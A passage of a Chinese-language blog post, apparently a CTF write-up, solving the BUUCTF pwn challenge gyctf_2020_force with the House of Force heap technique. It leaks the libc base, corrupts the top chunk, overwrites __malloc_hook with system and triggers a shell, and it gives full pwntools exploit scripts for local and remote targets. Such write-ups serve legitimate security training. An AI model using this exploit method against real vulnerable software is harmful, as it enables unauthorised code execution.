+<p>把 ‘&#x2F;bin&#x2F;sh’ 写在 0xFFFFFFFFFFFFFFFF 前，以便后面通过 top chunk 调用 ‘&#x2F;bin&#x2F;sh’</p>
+<p><img src="/HFTTC.github.io/./img/zEfq0AduhIQgftQx/1773813733544-58c0cbcd-efcb-400a-ac11-248ac142286f-352872.png" alt="1773813733544-58c0cbcd-efcb-400a-ac11-248ac142286f.png"></p>
+<h4 id="往-malloc-hook-中写入-system"><a href="#往-malloc-hook-中写入-system" class="headerlink" title="往 malloc_hook 中写入 system"></a>往 malloc_hook 中写入 system</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">libc.address=add(<span class="number">0x200000</span>, <span class="string">&#x27;aaa\n&#x27;</span>) + <span class="number">0x200ff0</span></span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;libc.address :&quot;</span>+hex(libc.address))</span><br><span class="line"></span><br><span class="line">top_addr = add(<span class="number">0x18</span>,b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + b<span class="string">&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0xFFFFFFFFFFFFFFFF</span> | <span class="number">0x1</span>)) + <span class="number">0x10</span></span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;top :&quot;</span> + hex(top_addr))</span><br><span class="line"></span><br><span class="line">malloc_hook = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&#x27;malloc_hook :&#x27;</span>+hex(malloc_hook))</span><br><span class="line">    </span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&#x27;system :&#x27;</span> + hex(system))</span><br><span class="line">    </span><br><span class="line">offset = (malloc_hook - <span class="number">0x20</span>) - top_addr</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;offset :&quot;</span> + hex(offset))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>先计算 malloc_hook 和 top_chunk_addr + 0x20 之间的偏移，0x20 恰好是上面填充过后的位置</p>
+<h4 id="将-top-chunk-扩展到-malloc-hook-附近"><a href="#将-top-chunk-扩展到-malloc-hook-附近" class="headerlink" title="将 top chunk 扩展到 __malloc_hook 附近"></a>将 top chunk 扩展到 __malloc_hook 附近</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">addr = add(offset, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">addr1 = addr + offset</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;addr1 :&quot;</span>+hex(addr1))</span><br></pre></td></tr></table></figure>
+
+<p>addr1 就是创建新堆之后的 top_chunk 地址</p>
+<p><img src="/HFTTC.github.io/./img/zEfq0AduhIQgftQx/1773824641137-d11bc243-7eaf-414e-a02d-10a5e8c1031d-531399.png" alt="1773824641137-d11bc243-7eaf-414e-a02d-10a5e8c1031d.png"></p>
+<p><img src="/HFTTC.github.io/./img/zEfq0AduhIQgftQx/1773824623216-c6470f8e-63ce-4806-8e2a-b298928311cb-379646.png" alt="1773824623216-c6470f8e-63ce-4806-8e2a-b298928311cb.png"></p>
+<p>利用 offset 申请一次堆块：</p>
+<ul>
+<li>top chunk 会被 <strong>延伸到 __malloc_hook 附近</strong></li>
+<li>addr → 返回 payload 起始地址（下次 malloc 就会覆盖 __malloc_hook）</li>
+</ul>
+<p>这里在创建一个堆块，内容是 system ，前面的 memalign_hook 和 realloc_hook 用做堆块头，内容输入开始的地方直接是 malloc_hook</p>
+<h4 id="创建内容为-system-的堆块"><a href="#创建内容为-system-的堆块" class="headerlink" title="创建内容为 system 的堆块"></a>创建内容为 system 的堆块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addr2=add(<span class="number">0x10</span>,p64(system))</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;addr2 :&quot;</span>+hex(addr2))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/HFTTC.github.io/./img/zEfq0AduhIQgftQx/1773824847814-14de4542-d044-48dd-aef9-f08b55e2232a-212537.png" alt="1773824847814-14de4542-d044-48dd-aef9-f08b55e2232a.png"></p>
+<p><img src="/HFTTC.github.io/./img/zEfq0AduhIQgftQx/1773824828916-78c6f54b-21f4-4be6-a3fa-e7f37086a5d7-138072.png" alt="1773824828916-78c6f54b-21f4-4be6-a3fa-e7f37086a5d7.png"></p>
+<p>此时可以知道我们的内容就写在了 addr2 当中，也就是把 system 写入了 malloc_hook</p>
+<h4 id="再次申请触发-system-‘-bin-sh’"><a href="#再次申请触发-system-‘-bin-sh’" class="headerlink" title="再次申请触发 system(‘&#x2F;bin&#x2F;sh’);"></a>再次申请触发 system(‘&#x2F;bin&#x2F;sh’);</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">&quot;2:puts\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;size\n&quot;</span>)</span><br><span class="line">io.sendline(str(top))</span><br></pre></td></tr></table></figure>
+
+<p>再次调用 malloc：</p>
+<ul>
+<li>申请大小 &#x3D; top</li>
+<li>malloc 内部会执行 __malloc_hook(size)</li>
+<li>由于我们已经把 __malloc_hook 改成 system，所以实际上执行了：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(top)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>top 内部之前写了 &#x2F;bin&#x2F;sh\x00 → 得到 shell</li>
+</ul>
+<p>size 值原本我们给的是数值，会把这个数值给 rdi，现在给的是 top chunk 地址，给 rdi 的值就是 top 的内容</p>
+<h4 id="获取-shell"><a href="#获取-shell" class="headerlink" title="获取 shell"></a>获取 shell</h4><p><img src="/HFTTC.github.io/./img/zEfq0AduhIQgftQx/1773826168309-6d258317-b786-4952-b866-37247e0c112d-971759.png" alt="1773826168309-6d258317-b786-4952-b866-37247e0c112d.png"></p>
+<p>由于 BUU 平台只给了 libc，并没有给相应的 ld 文件，我们只能寻找对应版本的 glibc_all_in_one 进行 patch</p>
+<p>打本地自然就需要用自己的 glibc_all_in_one 中的 libc，不过打远程却需要 BUUCTF 官方给的 libc-2.23.so</p>
+<h5 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="meta"># io=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,25602)</span></span><br><span class="line">io= process(<span class="string">&#x27;./force&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./force&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/kali/Desktop/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;2:puts\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;size\n&quot;</span>, str(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;bin addr &quot;</span>)</span><br><span class="line">    addr = <span class="type">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;content\n&quot;</span>,content)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line">libc.address=add(<span class="number">0x200000</span>, <span class="string">&#x27;aaa\n&#x27;</span>)+<span class="number">0x200ff0</span></span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;libc.address :&quot;</span>+hex(libc.address))</span><br><span class="line"><span class="meta"># gdb.attach(io)</span></span><br><span class="line">top = add(<span class="number">0x18</span>,b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+b<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0xFFFFFFFFFFFFFFFF</span> | <span class="number">0x1</span>))+<span class="number">0x10</span></span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;top :&quot;</span>+hex(top))</span><br><span class="line"><span class="meta"># gdb.attach(io)</span></span><br><span class="line">malloc_hook=libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&#x27;malloc_hook :&#x27;</span>+hex(malloc_hook))</span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&#x27;system :&#x27;</span>+hex(system))</span><br><span class="line">offset = (malloc_hook<span class="number">-0x20</span>)-top</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;offset :&quot;</span>+hex(offset))</span><br><span class="line"></span><br><span class="line">addr=add(offset, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">addr1=addr+offset</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;addr1 :&quot;</span>+hex(addr1))</span><br><span class="line"><span class="meta"># gdb.attach(io)</span></span><br><span class="line">addr2=add(<span class="number">0x10</span>,p64(system))</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;addr2 :&quot;</span>+hex(addr2))</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;2:puts\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;size\n&quot;</span>)</span><br><span class="line">io.sendline(str(top))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h5 id="远程"><a href="#远程" class="headerlink" title="远程"></a>远程</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25602</span>)</span><br><span class="line"><span class="meta"># io= process(<span class="string">&#x27;./force&#x27;</span>)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./force&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;2:puts\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;size\n&quot;</span>, str(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;bin addr &quot;</span>)</span><br><span class="line">    addr = <span class="type">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;content\n&quot;</span>,content)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line">libc.address=add(<span class="number">0x200000</span>, <span class="string">&#x27;aaa\n&#x27;</span>)+<span class="number">0x200ff0</span></span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;libc.address :&quot;</span>+hex(libc.address))</span><br><span class="line"><span class="meta"># gdb.attach(io)</span></span><br><span class="line">top = add(<span class="number">0x18</span>,b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+b<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0xFFFFFFFFFFFFFFFF</span> | <span class="number">0x1</span>))+<span class="number">0x10</span></span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;top :&quot;</span>+hex(top))</span><br><span class="line"><span class="meta"># gdb.attach(io)</span></span><br><span class="line">malloc_hook=libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&#x27;malloc_hook :&#x27;</span>+hex(malloc_hook))</span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&#x27;system :&#x27;</span>+hex(system))</span><br><span class="line">offset = (malloc_hook<span class="number">-0x20</span>)-top</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;offset :&quot;</span>+hex(offset))</span><br><span class="line"></span><br><span class="line">addr=add(offset, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">addr1=addr+offset</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;addr1 :&quot;</span>+hex(addr1))</span><br><span class="line"><span class="meta"># gdb.attach(io)</span></span><br><span class="line">addr2=add(<span class="number">0x10</span>,p64(system))</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;addr2 :&quot;</span>+hex(addr2))</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;2:puts\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;size\n&quot;</span>)</span><br><span class="line">io.sendline(str(top))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>更新: 2026-03-18 17:32:16<br>原文: <a target="_blank" rel="noopener" href="https://www.yuque.com/idcm/wnemg9/tkc0o0zwuec67fd4">https://www.yuque.com/idcm/wnemg9/tkc0o0zwuec67fd4</a></p>
+</blockquote>
+
+    </div>
+    <footer class="article-footer">
+      
+      
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="index" class="lazyload">
+        <a href="/HFTTC.github.io/2026/04/28/PWN/PWNCTF/HouseOfForce%EF%BC%88topchunk%EF%BC%89/index/" aria-label="前一篇: index" title="前一篇: index"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            index
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="index" class="lazyload">
+      <a href="/HFTTC.github.io/2026/04/28/PWN/PWNCTF/HouseofEinherjar/index/" aria-label="后一篇: index"  title="后一篇: index"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          index
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      SEZUVEM=
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        292.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        24:34
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#House-Of-Force-%E4%BE%8B%E9%A2%98"><span class="toc-number">1.</span> <span class="toc-text">House Of Force 例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gyctf-2020-force-House-of-Force-%E5%8A%AB%E6%8C%81-malloc-hook"><span class="toc-number">1.1.</span> <span class="toc-text">gyctf_2020_force(House of Force&amp;劫持 malloc_hook)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#add"><span class="toc-number">1.1.1.</span> <span class="toc-text">add</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#put"><span class="toc-number">1.1.2.</span> <span class="toc-text">put</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mmap-%E7%94%B3%E8%AF%B7%E7%A9%BA%E9%97%B4%EF%BC%9A"><span class="toc-number">1.1.3.</span> <span class="toc-text">mmap 申请空间：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2-libc-%E5%9F%BA%E5%9C%B0%E5%9D%80"><span class="toc-number">1.1.4.</span> <span class="toc-text">泄露 libc 基地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#House-of-force-%E4%BF%AE%E6%94%B9-top-chunk"><span class="toc-number">1.1.5.</span> <span class="toc-text">House of force 修改 top_chunk</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BE%80-malloc-hook-%E4%B8%AD%E5%86%99%E5%85%A5-system"><span class="toc-number">1.1.6.</span> <span class="toc-text">往 malloc_hook 中写入 system</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86-top-chunk-%E6%89%A9%E5%B1%95%E5%88%B0-malloc-hook-%E9%99%84%E8%BF%91"><span class="toc-number">1.1.7.</span> <span class="toc-text">将 top chunk 扩展到 __malloc_hook 附近</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E5%86%85%E5%AE%B9%E4%B8%BA-system-%E7%9A%84%E5%A0%86%E5%9D%97"><span class="toc-number">1.1.8.</span> <span class="toc-text">创建内容为 system 的堆块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%8D%E6%AC%A1%E7%94%B3%E8%AF%B7%E8%A7%A6%E5%8F%91-system-%E2%80%98-bin-sh%E2%80%99"><span class="toc-number">1.1.9.</span> <span class="toc-text">再次申请触发 system(‘&#x2F;bin&#x2F;sh’);</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96-shell"><span class="toc-number">1.1.10.</span> <span class="toc-text">获取 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0"><span class="toc-number">1.1.10.1.</span> <span class="toc-text">本地</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B"><span class="toc-number">1.1.10.2.</span> <span class="toc-text">远程</span></a></li></ol></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/HFTTC.github.io/js/script.js"></script>
+
+
+  
+<script src="/HFTTC.github.io/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/HFTTC.github.io/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "SEZUVEM=",
+          title: "HouseOfForce例题",
+          url: "https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/PWN/PWNCTF/HouseOfForce%EF%BC%88topchunk%EF%BC%89/HouseOfForce%E4%BE%8B%E9%A2%98/",
+          excerpt: "",
+          description: "",
+          stripContent: "House Of Force 例题gyctf_2020_force(House of Force&amp;amp;劫持 malloc_hook)参考资料：https://tamoly.github.io/2025/07/12/BUUCTF-PWN%E9%A2%98%E8%A7%A3/gyctf_2020_force(House%20of%20Force%E5%92%8Csystem(‘bin%20sh’))&amp;#x2F;，不得不说这道题坑了我好久，libc 必须使用 BUUCTF 本地的，自己的 libc",
+          date: "Tue Apr 28 2026 18:25:57 GMT+0800",
+          updated: "Tue Apr 28 2026 19:19:30 GMT+0800",
+          cover: "/HFTTC.github.io/images/banner.webp",
+        };
+      </script>
+        
+<script src="/HFTTC.github.io/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/HFTTC.github.io/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
